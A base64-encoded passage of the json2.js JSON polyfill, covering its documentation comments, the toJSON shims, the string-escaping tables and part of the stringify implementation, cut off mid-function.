VzZW50ZWQgYnkgdGhlIG5hbWUvdmFsdWUgcGFpciB0aGF0IHNob3VsZCBiZSBzZXJpYWxpemVkLA0KICAgICAgICAgICAgb3IgdW5kZWZpbmVkIGlmIG5vdGhpbmcgc2hvdWxkIGJlIHNlcmlhbGl6ZWQuIFRoZSB0b0pTT04gbWV0aG9kDQogICAgICAgICAgICB3aWxsIGJlIHBhc3NlZCB0aGUga2V5IGFzc29jaWF0ZWQgd2l0aCB0aGUgdmFsdWUsIGFuZCB0aGlzIHdpbGwgYmUNCiAgICAgICAgICAgIGJvdW5kIHRvIHRoZSB2YWx1ZQ0KDQogICAgICAgICAgICBGb3IgZXhhbXBsZSwgdGhpcyB3b3VsZCBzZXJpYWxpemUgRGF0ZXMgYXMgSVNPIHN0cmluZ3MuDQoNCiAgICAgICAgICAgICAgICBEYXRlLnByb3RvdHlwZS50b0pTT04gPSBmdW5jdGlvbiAoa2V5KSB7DQogICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGYobikgew0KICAgICAgICAgICAgICAgICAgICAgICAgLy8gRm9ybWF0IGludGVnZXJzIHRvIGhhdmUgYXQgbGVhc3QgdHdvIGRpZ2l0cy4NCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBuIDwgMTAgPyAnMCcgKyBuIDogbjsNCiAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgIHJldHVybiB0aGlzLmdldFVUQ0Z1bGxZZWFyKCkgICArICctJyArDQogICAgICAgICAgICAgICAgICAgICAgICAgZih0aGlzLmdldFVUQ01vbnRoKCkgKyAxKSArICctJyArDQogICAgICAgICAgICAgICAgICAgICAgICAgZih0aGlzLmdldFVUQ0RhdGUoKSkgICAgICArICdUJyArDQogICAgICAgICAgICAgICAgICAgICAgICAgZih0aGlzLmdldFVUQ0hvdXJzKCkpICAgICArICc6JyArDQogICAgICAgICAgICAgICAgICAgICAgICAgZih0aGlzLmdldFVUQ01pbnV0ZXMoKSkgICArICc6JyArDQogICAgICAgICAgICAgICAgICAgICAgICAgZih0aGlzLmdldFVUQ1NlY29uZHMoKSkgICArICdaJzsNCiAgICAgICAgICAgICAgICB9Ow0KDQogICAgICAgICAgICBZb3UgY2FuIHByb3ZpZGUgYW4gb3B0aW9uYWwgcmVwbGFjZXIgbWV0aG9kLiBJdCB3aWxsIGJlIHBhc3NlZCB0aGUNCiAgICAgICAgICAgIGtleSBhbmQgdmFsdWUgb2YgZWFjaCBtZW1iZXIsIHdpdGggdGhpcyBib3VuZCB0byB0aGUgY29udGFpbmluZw0KICAgICAgICAgICAgb2JqZWN0LiBUaGUgdmFsdWUgdGhhdCBpcyByZXR1cm5lZCBmcm9tIHlvdXIgbWV0aG9kIHdpbGwgYmUNCiAgICAgICAgICAgIHNlcmlhbGl6ZWQuIElmIHlvdXIgbWV0aG9kIHJldHVybnMgdW5kZWZpbmVkLCB0aGVuIHRoZSBtZW1iZXIgd2lsbA0KICAgICAgICAgICAgYmUgZXhjbHVkZWQgZnJvbSB0aGUgc2VyaWFsaXphdGlvbi4NCg0KICAgICAgICAgICAgSWYgdGhlIHJlcGxhY2VyIHBhcmFtZXRlciBpcyBhbiBhcnJheSBvZiBzdHJpbmdzLCB0aGVuIGl0IHdpbGwgYmUNCiAgICAgICAgICAgIHVzZWQgdG8gc2VsZWN0IHRoZSBtZW1iZXJzIHRvIGJlIHNlcmlhbGl6ZWQuIEl0IGZpbHRlcnMgdGhlIHJlc3VsdHMNCiAgICAgICAgICAgIHN1Y2ggdGhhdCBvbmx5IG1lbWJlcnMgd2l0aCBrZXlzIGxpc3RlZCBpbiB0aGUgcmVwbGFjZXIgYXJyYXkgYXJlDQogICAgICAgICAgICBzdHJpbmdpZmllZC4NCg0KICAgICAgICAgICAgVmFsdWVzIHRoYXQgZG8gbm90IGhhdmUgSlNPTiByZXByZXNlbnRhdGlvbnMsIHN1Y2ggYXMgdW5kZWZpbmVkIG9yDQogICAgICAgICAgICBmdW5jdGlvbnMsIHdpbGwgbm90IGJlIHNlcmlhbGl6ZWQuIFN1Y2ggdmFsdWVzIGluIG9iamVjdHMgd2lsbCBiZQ0KICAgICAgICAgICAgZHJvcHBlZDsgaW4gYXJyYXlzIHRoZXkgd2lsbCBiZSByZXBsYWNlZCB3aXRoIG51bGwuIFlvdSBjYW4gdXNlDQogICAgICAgICAgICBhIHJlcGxhY2VyIGZ1bmN0aW9uIHRvIHJlcGxhY2UgdGhvc2Ugd2l0aCBKU09OIHZhbHVlcy4NCiAgICAgICAgICAgIEpTT04uc3RyaW5naWZ5KHVuZGVmaW5lZCkgcmV0dXJucyB1bmRlZmluZWQuDQoNCiAgICAgICAgICAgIFRoZSBvcHRpb25hbCBzcGFjZSBwYXJhbWV0ZXIgcHJvZHVjZXMgYSBzdHJpbmdpZmljYXRpb24gb2YgdGhlDQogICAgICAgICAgICB2YWx1ZSB0aGF0IGlzIGZpbGxlZCB3aXRoIGxpbmUgYnJlYWtzIGFuZCBpbmRlbnRhdGlvbiB0byBtYWtlIGl0DQogICAgICAgICAgICBlYXNpZXIgdG8gcmVhZC4NCg0KICAgICAgICAgICAgSWYgdGhlIHNwYWNlIHBhcmFtZXRlciBpcyBhIG5vbi1lbXB0eSBzdHJpbmcsIHRoZW4gdGhhdCBzdHJpbmcgd2lsbA0KICAgICAgICAgICAgYmUgdXNlZCBmb3IgaW5kZW50YXRpb24uIElmIHRoZSBzcGFjZSBwYXJhbWV0ZXIgaXMgYSBudW1iZXIsIHRoZW4NCiAgICAgICAgICAgIHRoZSBpbmRlbnRhdGlvbiB3aWxsIGJlIHRoYXQgbWFueSBzcGFjZXMuDQoNCiAgICAgICAgICAgIEV4YW1wbGU6DQoNCiAgICAgICAgICAgIHRleHQgPSBKU09OLnN0cmluZ2lmeShbJ2UnLCB7cGx1cmlidXM6ICd1bnVtJ31dKTsNCiAgICAgICAgICAgIC8vIHRleHQgaXMgJ1siZSIseyJwbHVyaWJ1cyI6InVudW0ifV0nDQoNCg0KICAgICAgICAgICAgdGV4dCA9IEpTT04uc3RyaW5naWZ5KFsnZScsIHtwbHVyaWJ1czogJ3VudW0nfV0sIG51bGwsICdcdCcpOw0KICAgICAgICAgICAgLy8gdGV4dCBpcyAnW1xuXHQiZSIsXG5cdHtcblx0XHQicGx1cmlidXMiOiAidW51bSJcblx0fVxuXScNCg0KICAgICAgICAgICAgdGV4dCA9IEpTT04uc3RyaW5naWZ5KFtuZXcgRGF0ZSgpXSwgZnVuY3Rpb24gKGtleSwgdmFsdWUpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gdGhpc1trZXldIGluc3RhbmNlb2YgRGF0ZSA/DQogICAgICAgICAgICAgICAgICAgICdEYXRlKCcgKyB0aGlzW2tleV0gKyAnKScgOiB2YWx1ZTsNCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgLy8gdGV4dCBpcyAnWyJEYXRlKC0tLWN1cnJlbnQgdGltZS0tLSkiXScNCg0KDQogICAgICAgIEpTT04ucGFyc2UodGV4dCwgcmV2aXZlcikNCiAgICAgICAgICAgIFRoaXMgbWV0aG9kIHBhcnNlcyBhIEpTT04gdGV4dCB0byBwcm9kdWNlIGFuIG9iamVjdCBvciBhcnJheS4NCiAgICAgICAgICAgIEl0IGNhbiB0aHJvdyBhIFN5bnRheEVycm9yIGV4Y2VwdGlvbi4NCg0KICAgICAgICAgICAgVGhlIG9wdGlvbmFsIHJldml2ZXIgcGFyYW1ldGVyIGlzIGEgZnVuY3Rpb24gdGhhdCBjYW4gZmlsdGVyIGFuZA0KICAgICAgICAgICAgdHJhbnNmb3JtIHRoZSByZXN1bHRzLiBJdCByZWNlaXZlcyBlYWNoIG9mIHRoZSBrZXlzIGFuZCB2YWx1ZXMsDQogICAgICAgICAgICBhbmQgaXRzIHJldHVybiB2YWx1ZSBpcyB1c2VkIGluc3RlYWQgb2YgdGhlIG9yaWdpbmFsIHZhbHVlLg0KICAgICAgICAgICAgSWYgaXQgcmV0dXJucyB3aGF0IGl0IHJlY2VpdmVkLCB0aGVuIHRoZSBzdHJ1Y3R1cmUgaXMgbm90IG1vZGlmaWVkLg0KICAgICAgICAgICAgSWYgaXQgcmV0dXJucyB1bmRlZmluZWQgdGhlbiB0aGUgbWVtYmVyIGlzIGRlbGV0ZWQuDQoNCiAgICAgICAgICAgIEV4YW1wbGU6DQoNCiAgICAgICAgICAgIC8vIFBhcnNlIHRoZSB0ZXh0LiBWYWx1ZXMgdGhhdCBsb29rIGxpa2UgSVNPIGRhdGUgc3RyaW5ncyB3aWxsDQogICAgICAgICAgICAvLyBiZSBjb252ZXJ0ZWQgdG8gRGF0ZSBvYmplY3RzLg0KDQogICAgICAgICAgICBteURhdGEgPSBKU09OLnBhcnNlKHRleHQsIGZ1bmN0aW9uIChrZXksIHZhbHVlKSB7DQogICAgICAgICAgICAgICAgdmFyIGE7DQogICAgICAgICAgICAgICAgaWYgKHR5cGVvZiB2YWx1ZSA9PT0gJ3N0cmluZycpIHsNCiAgICAgICAgICAgICAgICAgICAgYSA9DQovXihcZHs0fSktKFxkezJ9KS0oXGR7Mn0pVChcZHsyfSk6KFxkezJ9KTooXGR7Mn0oPzpcLlxkKik/KVokLy5leGVjKHZhbHVlKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGEpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgRGF0ZShEYXRlLlVUQygrYVsxXSwgK2FbMl0gLSAxLCArYVszXSwgK2FbNF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgK2FbNV0sICthWzZdKSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHZhbHVlOw0KICAgICAgICAgICAgfSk7DQoNCiAgICAgICAgICAgIG15RGF0YSA9IEpTT04ucGFyc2UoJ1siRGF0ZSgwOS8wOS8yMDAxKSJdJywgZnVuY3Rpb24gKGtleSwgdmFsdWUpIHsNCiAgICAgICAgICAgICAgICB2YXIgZDsNCiAgICAgICAgICAgICAgICBpZiAodHlwZW9mIHZhbHVlID09PSAnc3RyaW5nJyAmJg0KICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWUuc2xpY2UoMCwgNSkgPT09ICdEYXRlKCcgJiYNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlLnNsaWNlKC0xKSA9PT0gJyknKSB7DQogICAgICAgICAgICAgICAgICAgIGQgPSBuZXcgRGF0ZSh2YWx1ZS5zbGljZSg1LCAtMSkpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoZCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGQ7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHZhbHVlOw0KICAgICAgICAgICAgfSk7DQoNCg0KICAgIFRoaXMgaXMgYSByZWZlcmVuY2UgaW1wbGVtZW50YXRpb24uIFlvdSBhcmUgZnJlZSB0byBjb3B5LCBtb2RpZnksIG9yDQogICAgcmVkaXN0cmlidXRlLg0KKi8NCg0KLypqc2xpbnQgZXZpbDogdHJ1ZSwgc3RyaWN0OiBmYWxzZSAqLw0KDQovKm1lbWJlcnMgIiIsICJcYiIsICJcdCIsICJcbiIsICJcZiIsICJcciIsICJcIiIsIEpTT04sICJcXCIsIGFwcGx5LA0KICAgIGNhbGwsIGNoYXJDb2RlQXQsIGdldFVUQ0RhdGUsIGdldFVUQ0Z1bGxZZWFyLCBnZXRVVENIb3VycywNCiAgICBnZXRVVENNaW51dGVzLCBnZXRVVENNb250aCwgZ2V0VVRDU2Vjb25kcywgaGFzT3duUHJvcGVydHksIGpvaW4sDQogICAgbGFzdEluZGV4LCBsZW5ndGgsIHBhcnNlLCBwcm90b3R5cGUsIHB1c2gsIHJlcGxhY2UsIHNsaWNlLCBzdHJpbmdpZnksDQogICAgdGVzdCwgdG9KU09OLCB0b1N0cmluZywgdmFsdWVPZg0KKi8NCg0KDQovLyBDcmVhdGUgYSBKU09OIG9iamVjdCBvbmx5IGlmIG9uZSBkb2VzIG5vdCBhbHJlYWR5IGV4aXN0LiBXZSBjcmVhdGUgdGhlDQovLyBtZXRob2RzIGluIGEgY2xvc3VyZSB0byBhdm9pZCBjcmVhdGluZyBnbG9iYWwgdmFyaWFibGVzLg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdmFyIEpTT04gPSB3aW5kb3cuSlNPTiB8fCB7fTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCihmdW5jdGlvbiAoKSB7DQoNCiAgICBmdW5jdGlvbiBmKG4pIHsNCiAgICAgICAgLy8gRm9ybWF0IGludGVnZXJzIHRvIGhhdmUgYXQgbGVhc3QgdHdvIGRpZ2l0cy4NCiAgICAgICAgcmV0dXJuIG4gPCAxMCA/ICcwJyArIG4gOiBuOw0KICAgIH0NCg0KICAgIGlmICh0eXBlb2YgRGF0ZS5wcm90b3R5cGUudG9KU09OICE9PSAnZnVuY3Rpb24nKSB7DQoNCiAgICAgICAgRGF0ZS5wcm90b3R5cGUudG9KU09OID0gZnVuY3Rpb24gKGtleSkgew0KDQogICAgICAgICAgICByZXR1cm4gaXNGaW5pdGUodGhpcy52YWx1ZU9mKCkpID8NCiAgICAgICAgICAgICAgICAgICB0aGlzLmdldFVUQ0Z1bGxZZWFyKCkgICArICctJyArDQogICAgICAgICAgICAgICAgIGYodGhpcy5nZXRVVENNb250aCgpICsgMSkgKyAnLScgKw0KICAgICAgICAgICAgICAgICBmKHRoaXMuZ2V0VVRDRGF0ZSgpKSAgICAgICsgJ1QnICsNCiAgICAgICAgICAgICAgICAgZih0aGlzLmdldFVUQ0hvdXJzKCkpICAgICArICc6JyArDQogICAgICAgICAgICAgICAgIGYodGhpcy5nZXRVVENNaW51dGVzKCkpICAgKyAnOicgKw0KICAgICAgICAgICAgICAgICBmKHRoaXMuZ2V0VVRDU2Vjb25kcygpKSAgICsgJ1onIDogbnVsbDsNCiAgICAgICAgfTsNCg0KICAgICAgICBTdHJpbmcucHJvdG90eXBlLnRvSlNPTiA9DQogICAgICAgIE51bWJlci5wcm90b3R5cGUudG9KU09OID0NCiAgICAgICAgQm9vbGVhbi5wcm90b3R5cGUudG9KU09OID0gZnVuY3Rpb24gKGtleSkgew0KICAgICAgICAgICAgcmV0dXJuIHRoaXMudmFsdWVPZigpOw0KICAgICAgICB9Ow0KICAgIH0NCg0KICAgIHZhciBjeCA9IC9bXHUwMDAwXHUwMGFkXHUwNjAwLVx1MDYwNFx1MDcwZlx1MTdiNFx1MTdiNVx1MjAwYy1cdTIwMGZcdTIwMjgtXHUyMDJmXHUyMDYwLVx1MjA2Zlx1ZmVmZlx1ZmZmMC1cdWZmZmZdL2csDQogICAgICAgIGVzY2FwYWJsZSA9IC9bXFxcIlx4MDAtXHgxZlx4N2YtXHg5Zlx1MDBhZFx1MDYwMC1cdTA2MDRcdTA3MGZcdTE3YjRcdTE3YjVcdTIwMGMtXHUyMDBmXHUyMDI4LVx1MjAyZlx1MjA2MC1cdTIwNmZcdWZlZmZcdWZmZjAtXHVmZmZmXS9nLA0KICAgICAgICBnYXAsDQogICAgICAgIGluZGVudCwNCiAgICAgICAgbWV0YSA9IHsgICAgLy8gdGFibGUgb2YgY2hhcmFjdGVyIHN1YnN0aXR1dGlvbnMNCiAgICAgICAgICAgICdcYic6ICdcXGInLA0KICAgICAgICAgICAgJ1x0JzogJ1xcdCcsDQogICAgICAgICAgICAnXG4nOiAnXFxuJywNCiAgICAgICAgICAgICdcZic6ICdcXGYnLA0KICAgICAgICAgICAgJ1xyJzogJ1xccicsDQogICAgICAgICAgICAnIicgOiAnXFwiJywNCiAgICAgICAgICAgICdcXCc6ICdcXFxcJw0KICAgICAgICB9LA0KICAgICAgICByZXA7DQoNCg0KICAgIGZ1bmN0aW9uIHF1b3RlKHN0cmluZykgew0KDQovLyBJZiB0aGUgc3RyaW5nIGNvbnRhaW5zIG5vIGNvbnRyb2wgY2hhcmFjdGVycywgbm8gcXVvdGUgY2hhcmFjdGVycywgYW5kIG5vDQovLyBiYWNrc2xhc2ggY2hhcmFjdGVycywgdGhlbiB3ZSBjYW4gc2FmZWx5IHNsYXAgc29tZSBxdW90ZXMgYXJvdW5kIGl0Lg0KLy8gT3RoZXJ3aXNlIHdlIG11c3QgYWxzbyByZXBsYWNlIHRoZSBvZmZlbmRpbmcgY2hhcmFjdGVycyB3aXRoIHNhZmUgZXNjYXBlDQovLyBzZXF1ZW5jZXMuDQoNCiAgICAgICAgZXNjYXBhYmxlLmxhc3RJbmRleCA9IDA7DQogICAgICAgIHJldHVybiBlc2NhcGFibGUudGVzdChzdHJpbmcpID8NCiAgICAgICAgICAgICciJyArIHN0cmluZy5yZXBsYWNlKGVzY2FwYWJsZSwgZnVuY3Rpb24gKGEpIHsNCiAgICAgICAgICAgICAgICB2YXIgYyA9IG1ldGFbYV07DQogICAgICAgICAgICAgICAgcmV0dXJuIHR5cGVvZiBjID09PSAnc3RyaW5nJyA/IGMgOg0KICAgICAgICAgICAgICAgICAgICAnXFx1JyArICgnMDAwMCcgKyBhLmNoYXJDb2RlQXQoMCkudG9TdHJpbmcoMTYpKS5zbGljZSgtNCk7DQogICAgICAgICAgICB9KSArICciJyA6DQogICAgICAgICAgICAnIicgKyBzdHJpbmcgKyAnIic7DQogICAgfQ0KDQoNCiAgICBmdW5jdGlvbiBzdHIoa2V5LCBob2xkZXIpIHsNCg0KLy8gUHJvZHVjZSBhIHN0cmluZyBmcm9tIGhvbGRlcltrZXldLg0KDQogICAgICAgIHZhciBpLCAgICAgICAgICAvLyBUaGUgbG9vcCBjb3VudGVyLg0KICAgICAgICAgICAgaywgICAgICAgICAgLy8gVGhlIG1lbWJlciBrZXkuDQogICAgICAgICAgICB2LCAgICAgICAgICAvLyBUaGUgbWVtYmVyIHZhbHVlLg0KICAgICAgICAgICAgbGVuZ3RoLA0KICAgICAgICAgICAgbWluZCA9IGdhcCwNCiAgICAgICAgICAgIHBhcnRpYWwsDQogICAgICAgICAgICB2YWx1ZSA9IGhvbGRlcltrZXldOw0KDQovLyBJZiB0aGUgdmFsdWUgaGFzIGEgdG9KU09OIG1ldGhvZCwgY2FsbCBpdCB0byBvYnRhaW4gYSByZXBsYWNlbWVudCB2YWx1ZS4NCg0KICAgICAgICBpZiAodmFsdWUgJiYgdHlwZW9mIHZhbHVlID09PSAnb2JqZWN0JyAmJg0KICAgICAgICAgICAgICAgIHR5cGVvZiB2YWx1ZS50b0pTT04gPT09ICdmdW5jdGlvbicpIHsNCiAgICAgICAgICAgIHZhbHVlID0gdmFsdWUudG9KU09OKGtleSk7DQogICAgICAgIH0NCg0KLy8gSWYgd2Ugd2VyZSBjYWxsZWQgd2l0aCBhIHJlcGxhY2VyIGZ1bmN0aW9uLCB0aGVuIGNhbGwgdGhlIHJlcGxhY2VyIHRvDQovLyBvYnRhaW4gYSByZXBsYWNlbWVudCB2YWx1ZS4NCg0KICAgICAgICBpZiAodHlwZW9mIHJlcCA9PT0gJ2Z1bmN0aW9uJykgew0KICAgICAgICAgICAgdmFsdWUgPSByZXAuY2FsbChob2xkZXIsIGtleSwgdmFsdWUpOw0KICAgICAgICB9DQoNCi8vIFdoYXQgaGFwcGVucyBuZXh0IGRlcGVuZHMgb24gdGhlIHZhbHVlJ3MgdHlwZS4NCg0KICAgICAgICBzd2l0Y2ggKHR5cGVvZiB2YWx1ZSkgew0KICAgICAgICBjYXNlICdzdHJpbmcnOg0KICAgICAgICAgICAgcmV0dXJuIHF1b3RlKHZhbHVlKTsNCg0KICAgICAgICBjYXNlICdudW1iZXInOg0KDQovLyBKU09OIG51bWJlcnMgbXVzdCBiZSBmaW5pdGUuIEVuY29kZSBub24tZmluaXRlIG51bWJlcnMgYXMgbnVsbC4NCg0KICAgICAgICAgICAgcmV0dXJuIGlzRmluaXRlKHZhbHVlKSA/IFN0cmluZyh2YWx1ZSkgOiAnbnVsbCc7DQoNCiAgICAgICAgY2FzZSAnYm9vbGVhbic6DQogICAgICAgIGNhc2UgJ251bGwnOg0KDQovLyBJZiB0aGUgdmFsdWUgaXMgYSBib29sZWFuIG9yIG51bGwsIGNvbnZlcnQgaXQgdG8gYSBzdHJpbmcuIE5vdGU6DQovLyB0eXBlb2YgbnVsbCBkb2VzIG5vdCBwcm9kdWNlICdudWxsJy4gVGhlIGNhc2UgaXMgaW5jbHVkZWQgaGVyZSBpbg0KLy8gdGhlIHJlbW90ZSBjaGFuY2UgdGhhdCB0aGlzIGdldHMgZml4ZWQgc29tZWRheS4NCg0KICAgICAgICAgICAgcmV0dXJuIFN0cmluZyh2YWx1ZSk7DQoNCi8vIElmIHRoZSB0eXBlIGlzICdvYmplY3QnLCB3ZSBtaWdodCBiZSBkZWFsaW5nIHdpdGggYW4gb2JqZWN0IG9yIGFuIGFycmF5IG9yDQovLyBudWxsLg0KDQogICAgICAgIGNhc2UgJ29iamVjdCc6DQoNCi8vIER1ZSB0byBhIHNwZWNpZmljYXRpb24gYmx1bmRlciBpbiBFQ01BU2NyaXB0LCB0eXBlb2YgbnVsbCBpcyAnb2JqZWN0JywNCi8vIHNvIHdhdGNoIG91dCBmb3IgdGhhdCBjYXNlLg0KDQogICAgICAgICAgICBpZiAoIXZhbHVlKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuICdudWxsJzsNCiAgICAgICAgICAgIH0NCg0KLy8gTWFrZSBhbiBhcnJheSB0byBob2xkIHRoZSBwYXJ0aWFsIHJlc3VsdHMgb2Ygc3RyaW5naWZ5aW5nIHRoaXMgb2JqZWN0IHZhbHVlLg0KDQogICAgICAgICAgICBnYXAgKz0gaW5kZW50Ow0KICAgICAgICAgICAgcGFydGlhbCA9IFtdOw0KDQovLyBJcyB0aGUgdmFsdWUgYW4gYXJyYXk/DQoNCiAgICAgICAgICAgIGlmIChPYmplY3QucHJvdG90eXBlLnRvU3RyaW5nLmFwcGx5KHZhbHVlKSA9PT0gJ1tvYmplY3QgQXJyYXldJykgew0KDQovLyBUaGUgdmFsdWUgaXMgYW4gYXJyYXkuIFN0cmluZ2lmeSBldmVyeSBlbGVtZW50LiBVc2UgbnVsbCBhcyBhIHBsYWNlaG9sZGVyDQovLyBmb3Igbm9uLUpTT04gdmFsdWVzLg0KDQogICAgICAgICAgICAgICAgbGVuZ3RoID0gdmFsdWUubGVuZ3RoOw0KICAgICAgICAgICAgICAgIGZvciAoaSA9IDA7IGkgPCBsZW5ndGg7IGkgKz0gMSkgew0KICAgICAgICAgICAgICAgICAgICBwYXJ0aWFsW2ldID0gc3RyKGksIHZhbHVlKSB8fCAnbnVsbCc7DQogICAgICAgICAgICAgICAgfQ0KDQovLyBKb2luIGFsbCBvZiB0aGUgZWxlbWVudHMgdG9nZXRoZXIsIHNlcGFyYXRlZCB3aXRoIGNvbW1hcywgYW5kIHdyYXAgdGhlbSBpbg0KLy8gYnJhY2tldHMuDQoNCiAgICAgICAgICAgICAgICB2ID0gcGFydGlhbC5sZW5ndGggPT09IDAgPyAnW10nIDoNCiAgICAgICAgICAgICAgICAgICAgZ2FwID8gJ1tcbicgKyBnYXAgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnRpYWwuam9pbignLFxuJyArIGdhcCkgKyAnXG4nICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWluZCArICddJyA6DQogICAgICAgICAgICAgICAgICAgICAgICAgICdbJyArIHBhcnRpYWwuam9pbignLCcpICsgJ10nOw0KICAgICAgICAgICAgICAgIGdhcCA9IG1pbmQ7DQogICAgICAgICAgICAgICAgcmV0dXJuIHY7DQogICAgICAgICAgICB9DQoNCi8vIElmIHRoZSByZXBsYWNlciBpcyBhbiBhcnJheSwgdXNlIGl0IHRvIHNlbGVjdCB0aGUgbWVtYmVycyB0byBiZSBzdHJpbmdpZmllZC4NCg0KICAgICAgICAgICAgaWYgKHJlcCAmJiB0eXBlb2YgcmVwID09PSAnb2JqZWN0Jykgew0KICAgICAgICAgICAgICAgIGxlbmd0aCA9IHJlcC5sZW5ndGg7DQogICAgICAgICAgICAgICAgZm9yIChpID0gMDsgaSA8IGxlbmd0aDsgaSArPSAxKSB7DQogICAgICAgICAgICAgICAgICAgIGsgPSByZXBbaV07DQogICAgICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgayA9PT0gJ3N0cmluZycpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHYgPSBzdHIoaywgdmFsdWUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHYpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJ0aWFsLnB1c2gocXVvdGUoaykgKyAoZ2FwID8gJzogJyA6ICc6JykgKyB2KTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gZWxzZSB7DQoNCi8vIE90aGVyd2lzZSwgaXRlcmF0ZSB0aHJvdWdoIGFsbCBvZiB0aGUga2V5cyBpbiB0aGUgb2JqZWN0Lg0KDQogICAgICAgICAgICAgICAgZm9yIChrIGluIHZhbHVlKSB7DQogICAgICAgICAgICAgICAgICAgIGlmIChPYmplY3QuaGFzT3duUHJvcGVydHkuY2FsbCh2YWx1ZSwgaykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHYgPSBzdHIoaywgdmFsdWUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHYpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJ0aWFsLnB1c2gocXVvdGUoaykgKyAoZ2FwID8gJzogJyA6ICc6JykgKyB2KTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KLy8gSm9pbiBhbGwgb2YgdGhlIG1lbWJlciB0ZXh0cyB0b2dldGhlciwgc2VwYXJhdGVkIHdpdGggY29tbWFzLA0KLy8gYW5kIHdyYXAgdGhlbSBpbiBicmFjZXMuDQoNCiAgICAgICAgICAgIHYgPSBwYXJ0aWFsLmxlbmd0aCA9PT0gMCA/ICd7fScgOg0KICAgICAgICAgICAgICAgIGdhcCA/ICd7XG4nICsgZ2FwICsgcGFydGlhbC5qb2luKCcsXG4nICsgZ2FwKSArICdcbicgKw0KICAgICAgICAgICAgICAgICAgICAgICAgbWluZCArICd9JyA6ICd7JyArIHBhcnRpYWwuam9pbignLCcpICsgJ30nOw0KICAgICAgICAgICAgZ2FwID0gbWluZDsNCiAgICAgICAgICAgIHJldHVybiB2Ow0KICAgICAgICB9DQogICAgfQ0KDQovLyBJZiB0aGUgSlNPTiBvYmplY3QgZG9lcyBub3QgeWV0IGhhdmUgYSBzdHJpbmdpZnkgbWV0aG9kLCBnaXZlIGl0IG9uZS4NCg0KICAgIGlmICh0eXBlb2YgSlNPTi5zdHJpbmdpZnkgIT09ICdmdW5jdGlvbicpIHsNCiAgICAgICAgSlNPTi5zdHJpbmdpZnkgPSBmdW5jdGlvbiAodmFsdWUsIHJlcGxhY2VyLCBzcGFjZSkgew0KDQovLyBUaGUgc3RyaW5naWZ5IG1ldGhvZCB0YWtlcyBhIHZhbHVlIGFuZCBhbiBvcHRpb25hbCByZXBsYWNlciwgYW5kIGFuIG9wdGlvbmFsDQovLyBzcGFjZSBwYXJhbWV0ZXIsIGFuZCByZXR1cm5zIGEgSlNPTiB0ZXh0LiBUaGUgcmVwbGFjZXIgY2FuIGJlIGEgZnVuY3Rpb24NCi8vIHRoYXQgY2FuIHJlcGxhY2UgdmFsdWVzLCBvciBhbiBhcnJheSBvZiBzdHJpbmdzIHRoYXQgd2lsbCBzZWxlY3QgdGhlIGtleXMuDQovLyBBIGRlZmF1bHQgcmVwbGFjZXIgbWV0aG9kIGNhbiBiZSBwcm92aWRlZC4gVXNlIG9mIHRoZSBzcGFjZSBwYXJhbWV0ZXIgY2FuDQovLyBwcm9kdWNlIHRleHQgdGhhdCBpcyBtb3JlIGVhc2lseSByZWFkYWJsZS4NCg0KICAgICAgICAgICAgdmFyIGk7DQogICAgICAgICAgICBnYXAgPSAnJzsNCiAgICAgICAgICAgIGluZGVudCA9ICcnOw0KDQovLyBJZiB0aGUgc3BhY2UgcGFyYW1ldGVyIGlzIGEgbnVtYmVyLCBtYWtlIGFuIGluZGVudCBzdHJpbmcgY29udGFpbmluZyB0aGF0DQovLyBtYW55IHNwYWNlcy4NCg0KICAgICAgICAgICAgaWYgKHR5cGVvZiBzcGFjZSA9PT0gJ251bWJlcicpIHsNCiAgICAgICAgICAgICAgICBmb3IgKGkgPSAwOyBpIDwgc3BhY2U7IGkgKz0gMSkgew0KICAgICAgICAgICAgICAgICAgICBpbmRlbnQgKz0gJyAnOw0KICAgICAgICAgICAgICAgIH0NCg0KLy8gSWYgdGhlIHNwYWNlIHBhcmFtZXRlciBpcyBhIHN0cmluZywgaXQgd2lsbCBiZSB1c2VkIGFzIHRoZSBpbmRlbnQgc3RyaW5nLg0KDQogICAgICAgICAgICB9IGVsc2UgaWYgKHR5cGVvZiBzcGFjZSA9PT0gJ3N0cmluZycpIHsNCiAgICAgICAgICAgICAgICBpbmRlbnQgPSBzcGFjZTs